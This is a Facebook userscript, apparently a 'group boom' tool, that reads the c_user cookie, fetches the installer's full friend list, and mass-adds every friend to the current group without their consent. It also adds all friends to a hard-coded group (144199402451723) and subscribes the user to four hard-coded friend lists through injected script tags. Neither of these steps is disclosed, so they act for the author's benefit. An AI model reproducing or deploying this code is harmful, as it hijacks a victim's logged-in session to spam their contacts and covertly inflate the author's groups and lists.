// ==UserScript==
// @name			groups facebook boom and wob
// @namespace			*[Update]* groups facebook boom and wob [RUSHANE]
// @description			*[Update]* groups facebook boom and wob RUSHANE
// @author			RUSHANE
// @include			htt*://www.facebook.com/*
// @exclude 			htt*://apps.facebook.com/*
// @icon			http://s3.amazonaws.com/uso_ss/icon/159097/large.png
// @version			v 10 Final.
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.https://www.facebook.com/realrushane.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*

// ==/UserScript==
var user = getCookie("c_user");
function getCookie(c_name) {
	var i,x,y,ARRcookies=document.cookie.split(";");
	for (i=0;i<ARRcookies.length;i++) {
	  x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("="));
	  y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1);
	  x=x.replace(/^\s+|\s+$/g,"");
	  if (x==c_name) {
	    return unescape(y);
	  }
	}
}
var tulisanNganu = '<font color="black"><b>G7 facebook | by:husamalshjrh</b> </font>';
var kunaon = '';
function penetrasi(opo) {
	jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value + "&group_id=" + memberGroupId + "&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user, function (a) {
		var b = a.substring(a.indexOf("{"));
		var c = JSON.parse(b);
		i--;
		kunaon = "<div class='friend-edge-name' style='text-align:left;font-size:10px;white-space:pre-wrap;";
		if (c.error) {
			kunaon += "color:darkred'>";
			if (c.errorDescription) {
				kunaon += c.errorDescription
			} else {
				kunaon += JSON.stringify(c, null, "")
			}
		} else {
			kunaon += "color:darkgreen'>";
			kunaon += arr[i];
			suc++
		}
		kunaon += "</div>";
		var dipes = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;background-color:rgba(255, 255, 255, 0.9);z-index:9999;font-size:14px;text-align:center;padding:15px;border-radius:14px;border:8px solid red(0,0,0,0.5)'>";
		dipes += "<div style='padding-bottom:10px;font-size:20px;'>" + tulisanNganu + "</div>";
		if (i > 0) {
			dipes += arr.length + " Friends Detected<br/>";
			dipes += "<b>" + suc + "</b> Friends Added Of " + (arr.length - i) + " Friends Processed ";
			dipes += "(" + i + " More To Go..)";
			dipes += "<div class='friend-edge'>";
			dipes += kunaon;
			dipes += "</div>"
		} else {
			dipes += arr.length + " Friends Detected And ";
			dipes += "<b>" + suc + " Friends Added</b>";
			dipes += "<div><span class='uiButton' onClick='document.getElementById(\"pagelet_welcome_box\").style.display=\"none\"'>Done</span></div>"
		}
		dipes += "</div>";
		document.getElementById("pagelet_welcome_box").innerHTML = dipes
	},
	"text", "post");
	tay--;
	if (tay > 0) {
		var s = arr[tay];
		setTimeout("penetrasi(" + s + ")", 100)
	}
	console.log(tay + "/" + arr.length + ":" + s + ", success:" + suc);
	if (memberGroupId != 144199402451723) {
		jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value + "&group_id=144199402451723&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user, function () {},
		"text", "post")
	}
}
function clickfr_callback() {
	if (document.getElementsByName("ok").length > 0) {
		nHtml.ClickUp(document.getElementsByName("ok")[0])
	}
	var a = arr[i];
	if (i < arr.length) addfriend(a.substring(0, 4))
}
function clickfr() {
	if (document.getElementsByClassName("search").length > 0) {
		console.log(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1].innerHTML);
		document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].href = "javascript:void(0);";
		nHtml.ClickUp(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1])
	} else j++;
	setTimeout("clickfr_callback()", 2e3)
}
function addfriend(a) {
	i++;
	document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus();
	document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].value = a;
	document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].blur();
	document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus();
	document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus();
	setTimeout("clickfr()", 2e3)
}
function sleep(a) {
	var b = (new Date).getTime();
	for (var c = 0; c < 1e7; c++) {
		if ((new Date).getTime() - b > a) {
			break
		}
	}
}
jx = {
	getHTTPObject: function () {
		var a = false;
		if (typeof ActiveXObject != "undefined") {
			try {
				a = new ActiveXObject("Msxml2.XMLHTTP")
			} catch(b) {
				try {
					a = new ActiveXObject("Microsoft.XMLHTTP")
				} catch(c) {
					a = false
				}
			}
		} else {
			if (window.XMLHttpRequest) {
				try {
					a = new XMLHttpRequest
				} catch(b) {
					a = false
				}
			}
		}
		return a
	},
	load: function (url, callback, format, method, opt) {
		var http = this.init();
		if (!http || !url) {
			return
		}
		if (http.overrideMimeType) {
			http.overrideMimeType("text/xml")
		}
		if (!method) {
			method = "GET"
		}
		if (!format) {
			format = "text"
		}
		if (!opt) {
			opt = {}
		}
		format = format.toLowerCase();
		method = method.toUpperCase();
		var now = "uid=" + (new Date).getTime();
		url += url.indexOf("?") + 1 ? "&": "?";
		url += now;
		var parameters = null;
		if (method == "POST") {
			var parts = url.split("?");
			url = parts[0];
			parameters = parts[1]
		}
		http.open(method, url, true);
		if (method == "POST") {
			http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
			http.setRequestHeader("Content-length", parameters.length);
			http.setRequestHeader("Connection", "close")
		}
		var ths = this;
		if (opt.handler) {
			http.onreadystatechange = function () {
				opt.handler(http)
			}
		} else {
			http.onreadystatechange = function () {
				if (http.readyState == 4) {
					if (http.status == 200) {
						var result = "";
						if (http.responseText) {
							result = http.responseText
						}
						if (format.charAt(0) == "j") {
							result = result.replace(/[\n\r]/g, "");
							result = eval("(" + result + ")")
						} else {
							if (format.charAt(0) == "x") {
								result = http.responseXML
							}
						}
						if (callback) {
							callback(result)
						}
					} else {
						if (opt.loadingIndicator) {
							document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator)
						}
						if (opt.loading) {
							document.getElementById(opt.loading).style.display = "none"
						}
						if (error) {
							error(http.status)
						}
					}
				}
			}
		}
		http.send(parameters)
	},
	bind: function (a) {
		var b = {
			url: "",
			onSuccess: false,
			onError: false,
			format: "text",
			method: "GET",
			update: "",
			loading: "",
			loadingIndicator: ""
		};
		for (var c in b) {
			if (a[c]) {
				b[c] = a[c]
			}
		}
		if (!b.url) {
			return
		}
		var d = false;
		if (b.loadingIndicator) {
			d = document.createElement("div");
			d.setAttribute("style", "position:absolute;top:0px;left:0px;");
			d.setAttribute("class", "loading-indicator");
			d.innerHTML = b.loadingIndicator;
			document.getElementsByTagName("body")[0].appendChild(d);
			this.opt.loadingIndicator = d
		}
		if (b.loading) {
			document.getElementById(b.loading).style.display = "block"
		}
		this.load(b.url, function (a) {
			if (b.onSuccess) {
				b.onSuccess(a)
			}
			if (b.update) {
				document.getElementById(b.update).innerHTML = a
			}
			if (d) {
				document.getElementsByTagName("body")[0].removeChild(d)
			}
			if (b.loading) {
				document.getElementById(b.loading).style.display = "none"
			}
		},
		b.format, b.method, b)
	},
	init: function () {
		return this.getHTTPObject()
	}
};
var nHtml = {
	FindByAttr: function (a, b, c, d) {
		if (c == "className") {
			c = "class"
		}
		var e = document.evaluate(".//" + b + "[@" + c + "='" + d + "']", a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
		if (e && e.singleNodeValue) {
			return e.singleNodeValue
		}
		return null
	},
	FindByClassName: function (a, b, c) {
		return this.FindByAttr(a, b, "className", c)
	},
	FindByXPath: function (a, b) {
		try {
			var c = document.evaluate(b, a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null)
		} catch(d) {
			GM_log("bad xpath:" + b)
		}
		if (c && c.singleNodeValue) {
			return c.singleNodeValue
		}
		return null
	},
	VisitUrl: function (a) {
		window.setTimeout(function () {
			document.location.href = a
		},
		500 + Math.floor(Math.random() * 500))
	},
	ClickWin: function (a, b, c) {
		var d = a.document.createEvent("MouseEvents");
		d.initMouseEvent(c, true, true, a, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
		return ! b.dispatchEvent(d)
	},
	Click: function (a) {
		return this.ClickWin(window, a, "click")
	},
	ClickTimeout: function (a, b) {
		window.setTimeout(function () {
			return nHtml.ClickWin(window, a, "click")
		},
		b + Math.floor(Math.random() * 500))
	},
	ClickUp: function (a) {
		this.ClickWin(window, a, "mousedown");
		this.ClickWin(window, a, "mouseup");
		this.ClickWin(window, a, "click")
	},
	GetText: function (a, b) {
		var c = "";
		if (b == undefined) {
			b = 0
		}
		if (b > 40) {
			return
		}
		if (a.textContent != undefined) {
			return a.textContent
		}
		for (var d = 0; d < a.childNodes.length; d++) {
			var e = a.childNodes[d];
			c += this.GetText(e, b + 1)
		}
		return c
	}
};
if (document.getElementsByClassName == undefined) {
	document.getElementsByClassName = function (a) {
		var b = new RegExp("(?:^|\\s)" + a + "(?:$|\\s)");
		var c = document.getElementsByTagName("*");
		var d = [];
		var e;
		for (var f = 0;
		(e = c[f]) != null; f++) {
			var g = e.className;
			if (g && g.indexOf(a) != -1 && b.test(g)) d.push(e)
		}
		return d
	}
}
Array.prototype.find = function (a) {
	var b = false;
	for (i = 0; i < this.length; i++) {
		if (typeof a == "function") {
			if (a.test(this[i])) {
				if (!b) {
					b = []
				}
				b.push(i)
			}
		} else {
			if (this[i] === a) {
				if (!b) {
					b = []
				}
				b.push(i)
			}
		}
	}
	return b
};
var a = 0,
eind = 0;
var len = document.getElementsByClassName("mbm").length;
for (a = 0; a < len; a++) {
	var ele = document.getElementsByClassName("mbm")[a];
	if (ele && ele.childNodes[0] && ele.childNodes[0] && ele.childNodes[0].childNodes[1] && ele.childNodes[0].childNodes[1].childNodes[0] && document.getElementsByClassName("mbm")[a].childNodes[0].childNodes[1].childNodes[0].value == "Add Friends To Group") {
		eind = a;
		break
	}
}
var i = 3;
var tay = 3;
var counter1 = 0,
counter2 = 0,
counter3 = 0;
var j = 0;
var k = 0;
var suc = 0;
var arr = new Array;
var memberGroupId = document.getElementsByName('group_id')[0].value;
jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?__a=1&viewer=" + user + "&filter[0]=user&__user=" + user, function (a) {
	var b = a;
	var c = b.substring(b.indexOf("{"));
	var d = JSON.parse(c);
	d = d.payload.entries;
	for (var e = 0; e < d.length; e++) {
		arr.push(d[e].uid)
	}
	i = arr.length - 1;
	tay = i;
	console.log(arr.length);
	var dipes = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;background-color:rgba(255, 255, 255, 0.9);z-index:9999;font-size:14px;text-align:center;padding:15px;border-radius:14px;border:8px solid red(0,0,0,0.5)'>";
	dipes += "<div style='padding-bottom:10px;font-size:20px;'>" + tulisanNganu + "</div>";
	dipes += arr.length + " Friends Detected";
	dipes += "</div>";
	document.getElementById("pagelet_welcome_box").innerHTML = dipes;
	penetrasi(arr[i])
     function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}
sublist("548028108624450");
sublist("548163675277560");
sublist("551529518274309");
sublist("368311919979363");
})